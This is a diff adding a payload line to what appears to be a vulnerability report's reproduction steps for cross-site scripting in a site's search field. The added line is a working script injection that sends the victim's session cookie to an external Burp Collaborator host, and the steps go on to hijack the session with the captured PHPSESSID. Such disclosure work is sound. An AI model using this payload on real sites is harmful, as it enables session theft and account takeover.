@@ -11,6 +11,7 @@ The search functionality executes injected JavaScript in the user's browser. The
 1. Visit the affected URL and click Join.
 2. Register and sign in to a test account.
 3. Enter the payload shown below in the search field and submit it.
+    ``'"><script>document.write(`<img src=https://zy1p23olh9sqv6wrdmcc8x1zjqphd71w.oastify.com/${document.cookie}>`)</script>``
 4. Check Burp Collaborator for an HTTP interaction containing the test account's PHPSESSID in the request path.
 5. Set the captured PHPSESSID cookie in a separate browser and refresh the site. The test account is displayed.
 
